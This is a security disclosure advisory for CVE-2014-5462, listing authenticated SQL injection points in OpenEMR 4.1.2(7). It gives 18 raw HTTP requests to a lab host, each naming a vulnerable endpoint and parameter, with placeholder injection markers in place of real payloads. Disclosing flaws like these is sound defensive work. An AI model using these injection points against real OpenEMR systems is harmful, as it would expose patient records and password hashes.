@@ -1,0 +1,268 @@
+Vulnerability title: Multiple Authenticated SQL Injections In OpenEMR
+CVE: CVE-2014-5462
+Vendor: OpenEMR
+Product: OpenEMR
+Affected version: 4.1.2(7) and earlier
+Fixed version: N/A
+Reported by: Jerzy Kramarz
+Details:
+
+SQL injection has been found and confirmed within the software as an authenticated user. A successful attack could allow an authenticated attacker to access information such as usernames and password hashes that are stored in the database.
+
+The following URLs and parameters have been confirmed to suffer from Multiple SQL injections:
+
+Request 1
+
+POST /openemr/interface/super/edit_layout.php HTTP/1.1
+Host: 192.168.56.102
+[...]
+Cookie: OpenEMR=nq2h24dbqlcgee1rlrk3ufutq7
+[...]
+Content-Length: 134
+
+formaction=&deletefieldid=&deletefieldgroup=&deletegroupname=&movegroupname=&movedirection=&selectedfields=&targetgroup=&layout_id=HIS<SQL Injection>
+
+
+Request 2
+
+POST /openemr/interface/reports/prescriptions_report.php HTTP/1.1
+Host: 192.168.56.102
+[...]
+Cookie: OpenEMR=lofk0gvs8h4ahj1fpq9g3tukk0
+[...]
+Content-Length: 135
+
+form_refresh=true&form_facility=&form_from_date=2014-01-01&form_to_date=2014-07-25&form_patient_id=1<SQL Injection>&form_drug_name=a<SQL Injection>&form_lot_number=1<SQL Injection>
+
+
+Request 3
+
+POST /openemr/interface/billing/edit_payment.php HTTP/1.1
+Host: 192.168.56.102
+[...]
+Content-Length: 186
+Cookie: pma_collation_connection=utf8_general_ci; PHPSESSID=ijfh4vsb18o425oupgt278md56; pma_theme=original; OpenEMR=3j8g58403l71iohk70l1oif3b5; pma_lang=en
+
+CountIndexAbove=0&ActionStatus=&CountIndexBelow=0&after_value=&DeletePaymentDistributionId=&hidden_type_code=&ajax_mode=&payment_id=1<SQL Injection*gt;&ParentPage=&hidden_patient_code=&global_amount=&mode=
+
+
+Request 4
+
+GET /openemr/interface/forms_admin/forms_admin.php?id=17<SQL Injection>&method=enable HTTP/1.1
+Host: 192.168.56.102
+[...]
+Cookie: OpenEMR=lofk0gvs8h4ahj1fpq9g3tukk0
+Connection: keep-alive
+
+
+Request 5
+
+POST /openemr/interface/billing/sl_eob_search.php HTTP/1.1
+Host: 192.168.56.102
+[...]
+Cookie: pma_collation_connection=utf8_general_ci; PHPSESSID=ijfh4vsb18o425oupgt278md56; pma_theme=original; OpenEMR=3j8g58403l71iohk70l1oif3b5; pma_lang=en
+
+----------1034262177
+Content-Disposition: form-data; name="form_pid"
+
+5<SQL Injection>
+----------1034262177
+Content-Disposition: form-data; name="form_without"
+
+on
+----------1034262177
+Content-Disposition: form-data; name="form_deposit_date"
+
+5
+----------1034262177
+Content-Disposition: form-data; name="form_paydate"
+
+5
+----------1034262177
+Content-Disposition: form-data; name="form_category"
+
+All
+----------1034262177
+Content-Disposition: form-data; name="form_erafile"; filename="file.txt"
+Content-Type: text/plain
+
+boom
+----------1034262177
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+5000000
+----------1034262177
+Content-Disposition: form-data; name="form_amount"
+
+5
+----------1034262177
+Content-Disposition: form-data; name="form_encounter"
+
+5<SQL Injection>
+----------1034262177
+Content-Disposition: form-data; name="form_to_date"
+
+5
+----------1034262177
+Content-Disposition: form-data; name="form_payer_id"
+
+2
+----------1034262177
+Content-Disposition: form-data; name="form_source"
+
+5
+----------1034262177
+Content-Disposition: form-data; name="form_name"
+
+BOOOM
+----------1034262177
+Content-Disposition: form-data; name="form_search"
+
+Search
+----------1034262177
+Content-Disposition: form-data; name="form_date"
+
+5-5-5
+----------1034262177--
+
+
+
+Request 6
+
+GET /openemr/interface/logview/logview.php?end_date=2014-07-25&sortby=<SQL Injection>&csum=&event=&check_sum=on&start_date=2014-07-25&type_event=select&eventname=login HTTP/1.1
+Host: 192.168.56.102
+[...]
+Cookie: pma_collation_connection=utf8_general_ci; PHPSESSID=ijfh4vsb18o425oupgt278md56; pma_theme=original; OpenEMR=3j8g58403l71iohk70l1oif3b5; pma_lang=en
+
+
+Request 7
+
+POST /openemr/interface/orders/procedure_stats.php HTTP/1.1
+Host: 192.168.56.102
+[...]
+Cookie: OpenEMR=lofk0gvs8h4ahj1fpq9g3tukk0
+
+form_sexes=1&form_to_date=2014-07-25&form_by=5&form_submit=Submit&form_show%5b%5d=.age&form_output=2&form_facility=4<SQL Injection>&form_from_date=0000-00-
+
+
+Request 8
+
+POST /openemr/interface/orders/pending_followup.php HTTP/1.1
+Host: 192.168.56.102
+[...]
+Cookie: pma_lang=en; pma_collation_connection=utf8_general_ci; PHPSESSID=ijfh4vsb18o425oupgt278md56; OpenEMR=lofk0gvs8h4ahj1fpq9g3tukk0; pma_theme=original
+
+form_to_date=2014-07-25&form_refresh=Refresh&form_facility=5<SQL Injection>&form_from_date=2014-07-25
+
+
+Request 9
+
+POST /openemr/interface/orders/pending_orders.php HTTP/1.1
+Host: 192.168.56.102
+[...]
+Cookie: OpenEMR=3j8g58403l71iohk70l1oif3b5
+
+form_to_date=2014-07-25&form_refresh=Refresh&form_facility=4<SQL Injection>&form_from_date=2014-07-25
+
+
+Request 10
+
+POST /openemr/interface/patient_file/deleter.php?patient=<SQL Injection>&encounterid=<SQL Injection>&formid=<SQL Injection>&issue=<SQL Injection>&document=&payment=&billing=&transaction= HTTP/1.1
+Host: 192.168.56.102
+[...]
+Cookie: OpenEMR=kpqal2o1e4am9eh0lce5qt3ab0
+
+form_submit=Yes%2c+Delete+and+Log
+
+
+Request 11
+
+POST /openemr/interface/patient_file/encounter/coding_popup.php HTTP/1.1
+Host: 192.168.56.102
+[...]
+Cookie: pma_lang=en; pma_collation_connection=utf8_general_ci; PHPSESSID=ijfh4vsb18o425oupgt278md56; OpenEMR=8oihner1200va2pr7oq1q67154
+
+Search+Results=&newcodes=&bn_search=Search&ProviderID=1&search_type=CPT4&search_term=5<SQL Injection>
+
+
+Request 12
+
+POST /openemr/interface/patient_file/encounter/search_code.php?type= HTTP/1.1
+Host: 192.168.56.102
+[...]
+Cookie: pma_lang=en; pma_collation_connection=utf8_general_ci; PHPSESSID=ijfh4vsb18o425oupgt278md56; OpenEMR=8oihner1200va2pr7oq1q67154
+
+text=5<SQL Injection<&submitbtn=Search&mode=search
+
+
+Request 13
+
+POST /openemr/interface/practice/ins_search.php HTTP/1.1
+Host: 192.168.56.102
+Accept: */*
+Accept-Language: en
+[...]
+Cookie: OpenEMR=kpqal2o1e4am9eh0lce5qt3ab0
+
+form_addr1=1<SQL Injection>&form_addr2=1<SQL Injection>&form_attn=5<SQL Injection>&form_country=U<SQL Injection>&form_freeb_type=2<SQL Injection>&form_phone=555-555-5555&form_partner=<SQL Injection>&form_name=P<SQL Injection>&form_zip=36<SQL Injection>&form_save=Save+as+New&form_state=W<SQL Injection>&form_city=W<SQL Injection>&form_cms_id=5<SQL Injection>
+
+
+Request 14
+
+POST /openemr/interface/patient_file/problem_encounter.php HTTP/1.1
+Host: 192.168.56.102
+[...]
+Cookie: OpenEMR=p0locr2jieuagul105rkm95ob6
+
+form_pelist=%2f&form_pid=0<SQL Injection>&form_save=Save&form_key=e
+
+
+Request 15
+
+POST /openemr/interface/reports/appointments_report.php HTTP/1.1
+Host: 192.168.56.102
+[...]
+Cookie: OpenEMR=3j8g58403l71iohk70l1oif3b5
+
+form_show_available=on&form_refresh=&form_to_date=2014-07-25&patient=<SQL Injection>&form_provider=1<SQL Injection>&form_apptstatus=<SQL Injection>&with_out_facility=on&form_facility=4<SQL Injection>&form_apptcat=9&form_from_date=2014-07-25&with_out_provider=on&form_orderby=date
+
+
+Request 16
+
+POST /openemr/interface/patient_file/summary/demographics_save.php HTTP/1.1
+Host: 192.168.56.102
+[...]
+Cookie: OpenEMR=3m910jdpv3bfed8kie9jihecn6; pma_lang=en; pma_collation_connection=utf8_general_ci
+
+form_i2subscriber_employer_country=USA&i3subscriber_DOB=0000-00-00&i3accept_assignment=FALSE&i3subscriber_city=Winterville&form_hipaa_mail=NO&form_allow_imm_info_share=NO&form_street=5&i3effective_date=0000-00-00&form_i1subscriber_state=AL&form_interpretter=5&i1subscriber_lname=boom&form_title=Mr.&i1subscriber_fname=boom&form_fname=Asd&form_i1subscriber_employer_state=AL&form_i1subscriber_relationship=self&form_i1subscriber_country=USA&form_i3subscriber_employer_state=AL&form_contact_relationship=5&form_mothersname=boom&i2group_number=5&form_em_state=AL&form_i3subscriber_country=USA&form_allow_patient_portal=NO&i2copay=5&i2policy_number=5&form_i2subscriber_sex=Female&i1accept_assignment=FALSE&i3subscriber_postal_code=SW1A+1AA&i2subscriber_ss=5&i1subscriber_mname=boom&form_pharmacy_id=0&i3subscriber_phone=5&form_phone_home=5&form_lname=Asd&mode=save&form_i2subscriber_country=USA&i2subscriber_employer=5&db_id=1<SQL Injection> &form_i1subscriber_employer_country=USA&form_d
+ eceased_reason=5&form_i2subscriber_state=AL&form_city=Winterville&form_email=winter@example.com&i3subscriber_employer_street=5&form_genericval2=asd&i3group_number=5&form_em_street=5&form_genericval1=asd&form_language=armenian&i1provider=&i2provider=&form_em_city=Winterville&form_em_name=boom&i3subscriber_fname=boom&form_race=amer_ind_or_alaska_native&i1plan_name=boom&i3subscriber_employer_city=Winterville&form_pubpid=asd&form_mname=Asd&i2subscriber_employer_street=5&form_financial_review=0000-00-00+00%3a00%3a00&i3subscriber_mname=boom&i3provider=&i3subscriber_employer_postal_code=SW1A+1AA&form_country_code=USA&form_em_country=USA&i2subscriber_phone=5&i3policy_number=5&form_status=married&form_ss=asdasd&form_monthly_income=01&i1effective_date=0000-00-00&form_i2subscriber_relationship=self&i3plan_name=boom&i1subscriber_employer_street=5&i1subscriber_city=Winterville&form_allow_imm_reg_use=NO&form_drivers_license=asd&form_i3subscriber_employer_country=USA&form_em_postal_code=SW
+ 1A+1AA&form_hipaa_message=30&i1subscriber_employer_city=Winterville&i1subscriber_postal_code=SW1A+1AA&i3copay=5&i1copay=5&i3subscriber_street=5&i3policy_type=12&i1subscriber_street=5&form_vfc=eligible&form_i2subscriber_employer_state=AL&i2subscriber_street=5&form_guardiansname=boom&i1policy_number=5&i3subscriber_lname=boom&form_phone_contact=5&i2subscriber_employer_postal_code=SW1A+1AA&form_homeless=5&form_i1subscriber_sex=Female&form_i3subscriber_state=AL&form_referral_source=Patient&i2subscriber_fname=boom&i1subscriber_ss=5&form_providerID=1&form_state=AL&form_postal_code=SW1A+1AA&form_hipaa_allowsms=NO&i1subscriber_DOB=0000-00-00&i2subscriber_employer_city=Winterville&form_hipaa_allowemail=NO&form_DOB=1994-02-07&form_deceased_date=0000-00-00+00%3a00%3a00&i2effective_date=0000-00-00&i2subscriber_DOB=0000-00-00&i2subscriber_postal_code=SW1A+1AA&form_genericname2=asdasd&form_genericname1=asasd&i1group_number=5&i2subscriber_mname=boom&i2accept_assignment=FALSE&i1subscriber_em
+ ployer=5&i3subscriber_ss=5&form_phone_cell=5&i2subscriber_lname=boom&form_ethnicity=hisp_or_latin&i1subscriber_phone=5&form_occupation=5&i3subscriber_employer=5&form_hipaa_voice=NO&form_allow_health_info_ex=NO&form_ref_providerID=1&i1policy_type=12&i1subscriber_employer_postal_code=SW1A+1AA&i2plan_name=boom&i2policy_type=12&form_hipaa_notice=NO&form_migrantseasonal=5&form_i3subscriber_relationship=self&form_i3subscriber_sex=Female&form_family_size=5&i2subscriber_city=Winterville&form_phone_biz=5&form_sex=Female
+
+
+Request 17
+
+GET /openemr/interface/fax/fax_dispatch_newpid.php?p=1<SQL Injection> HTTP/1.1
+Host: 192.168.56.102
+[...]
+Cookie: OpenEMR=3m910jdpv3bfed8kie9jihecn6
+Connection: keep-alive
+
+
+Request 18
+
+GET /openemr/interface/patient_file/reminder/patient_reminders.php?mode=simple&patient_id=1<SQL Injection> HTTP/1.1
+Host: 192.168.56.102
+[...]
+Cookie: OpenEMR=ra3sfkvd85bjve6qjm9ouq3225
+
+
+Further details at:
+
+https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-5462/
+
+Copyright:
+Copyright (c) Portcullis Computer Security Limited 2014, All rights reserved worldwide. Permission is hereby granted for the electronic redistribution of this information. It is not to be edited or altered in any way without the express written consent of Portcullis Computer Security Limited.
+
+Disclaimer:
+The information herein contained may change without notice. Use of this information constitutes acceptance for use in an AS IS condition. There are NO warranties, implied or otherwise, with regard to this information or its use. Any use of this information is at the user's risk. In no event shall the author/distributor (Portcullis Computer Security Limited) be held liable for any damages whatsoever arising out of or in connection with the use or spread of this information.
